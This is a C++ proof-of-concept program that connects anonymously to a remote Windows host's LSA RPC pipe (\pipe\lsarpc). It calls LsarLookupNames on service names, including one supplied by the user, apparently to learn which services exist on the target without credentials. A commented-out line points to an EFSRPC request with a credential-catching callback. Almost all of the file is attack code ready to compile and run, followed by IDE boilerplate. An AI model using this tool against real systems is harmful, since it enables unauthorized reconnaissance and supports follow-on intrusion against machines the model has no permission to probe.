// MS-lsat-poc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#define WIN32_NO_STATUS // This magic incantation lets us safely use NTSTATUS macros in userland
#include <windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include "rpc_helpers.h"
#include "ms-lsat.h"

RPC_UNICODE_STRING strings;

void usage()
{
    printf("<prog.exe> <target> <svcname>");
}



int list_names(RPC_BINDING_HANDLE* hrpc, va_list args)
{
    LSAPR_OBJECT_ATTRIBUTES lsa_obj = { 0 }; // sets root dir to null
    LSAPR_HANDLE hlsa = INVALID_HANDLE_VALUE;
    wchar_t junk[] = L"host";
    HRESULT hr = S_OK;
    RPC_UNICODE_STRING strings[3] = { 0 };
    make_unicode_str((PUNICODE_STRING)&(strings[0]), L"RasMan");
    make_unicode_str((PUNICODE_STRING) & (strings[1]), L"ThisSHouldNotExist");
    make_unicode_str((PUNICODE_STRING) & (strings[2]), va_arg(args, PCWSTR));
    hr = LsarOpenPolicy(junk, &lsa_obj, 0x20000000, &hlsa);
    if (!NT_SUCCESS(hr))
    {
        printf("failed to open policy %ld\n", hr);
        return FALSE;
    }
    PLSAPR_REFERENCED_DOMAIN_LIST refdomains = NULL;
    LSAPR_TRANSLATED_SIDS trans = { 0 };
    unsigned long retcount = 0;
    hr = LsarLookupNames(hlsa, 3, strings, &refdomains, &trans, LsapLookupWksta, &retcount);
    if (!NT_SUCCESS(hr))
    {
        printf("translation failed %ld\n", hr);
        return FALSE;
    }
    else
    {
        printf("it worked!");
        for (int i = 0; i < retcount; i++)
        {
            printf("%d", i);
        }
    }

}

int wmain(int argc, wchar_t ** argv)
{
    if (argc != 3)
    {
        usage();
        return (1);
    }
    //        make_rpc_request(efsrpcefsrpc_v1_0_c_ifspec, targetComputer, pipename, authtype, L"host", username, password, MS_EFSR_UUID, TRUE, EFSAuthRequest, credCatcher);
    make_rpc_request(lsarpc_v0_0_c_ifspec, argv[1], (RPC_WSTR)(L"\\pipe\\lsarpc"), 0, L"host", NULL, NULL, L"12345778-1234-ABCD-EF00-0123456789AB", TRUE, list_names, argv[2]);
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
